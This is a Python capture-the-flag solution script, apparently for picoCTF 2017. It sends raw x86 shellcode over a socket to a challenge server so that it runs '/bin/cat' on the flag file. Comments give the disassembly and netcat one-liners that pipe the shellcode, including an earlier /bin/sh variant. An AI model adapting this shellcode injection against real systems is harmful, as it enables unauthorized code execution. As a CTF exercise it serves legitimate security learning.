import socket

HOST = "shell2017.picoctf.com"
PORT = 23459

payload = b''

#payload += b'\x68\x2f\x73\x68\x00' 			#push 0x68732f2f
#payload += b'\x68\x2f\x62\x69\x6e' 			#push 0x6e69622f

payload += b'\x68\x74\x78\x74\x00'
payload += b'\x68\x6c\x61\x67\x2e'
payload += b'\x68\x20\x2e\x2f\x66'
payload += b'\x68\x2f\x63\x61\x74'
payload += b'\x68\x2f\x62\x69\x6e'
payload += b'\x87\xe3'
payload += b'\xb0\x0b'
payload += b'\xcd\x80'

#fflush(0)
payload += b'\x68\x00\x00\x00\x00'
#fflush 0x80483b0
payload += b'\xb8\xB0\x83\x04\x08'                                      #B8 B0830408           - mov eax,080483B0 { 134513584 }
payload += b'\xff\xd0'                                                  #call eax

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print(sock.recv(1024))
    print(sock.recv(1024))
    sock.sendall(payload)
    print(sock.recv(1024))
    print(sock.recv(1024))
    print(sock.recv(1024))
    sock.close()

main()


'''
68 2f 2f 73 68 			push 0x68732f2f
68 2f 62 69 6e 			push 0x6e69622f
87 e3 				xchg ebx,esp
b0 0b 				mov al,0xb
cd 80 				int 0x80


/bin/cat .flag.txt
\x2f\x62\x69\x6e
\x2f\x63\x61\x74
\x20\x2e\x2f\x66
\x6c\x61\x67\x2e
\x74\x78\x74\x00

//shellcode
\x68\x74\x78\x74\x00
\x68\x6c\x61\x67\x2e
\x68\x20\x2e\x2f\x66
\x68\x2f\x63\x61\x74
\x68\x2f\x62\x69\x6e
\x87\xe3
\xb0\x0b
\xcd\x80


\x31\xc0\x68\x74\x78\x74\x00\x68\x6c\x61\x67\x2e\x68\x20\x2e\x2f\x66\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80

python -c "print '\x31\xc0\x68\x74\x78\x74\x00\x68\x6c\x61\x67\x2e\x68\x20\x2e\x2f\x66\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80'" | nc shell2017.picoctf.com 23459

python -c "print '\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80h\x00\x00\x00\x00\xb8\xb0\x83\x04\x08\xff\xd0'" | nc shell2017.picoctf.com 23459
'''